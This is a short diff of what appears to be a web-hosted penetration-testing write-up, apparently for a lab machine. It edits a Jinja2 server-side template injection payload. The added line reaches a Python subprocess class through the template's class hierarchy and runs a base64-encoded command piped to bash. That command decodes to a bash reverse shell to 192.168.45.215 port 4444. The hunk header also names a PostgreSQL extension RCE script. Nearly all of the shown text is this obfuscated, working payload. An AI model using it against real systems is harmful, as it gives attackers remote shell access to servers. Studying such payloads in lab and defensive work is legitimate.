@@ -256,7 +256,7 @@ python2 postgresql_extension_rce_with_large_object.py 192.168.192.113:8443 192.1
 
         {% set mro_r = string|attr(class)|attr(mro) %}
         {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
-        {{ subclasses_r[459](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
+        {{ subclasses_r[459]('echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC40NS4yMTUvNDQ0NCA8JjEn | base64 -d | bash',shell=True,stdout=-1).communicate()[0].strip() }}
 
 </code></pre></div></div>
 <hr>
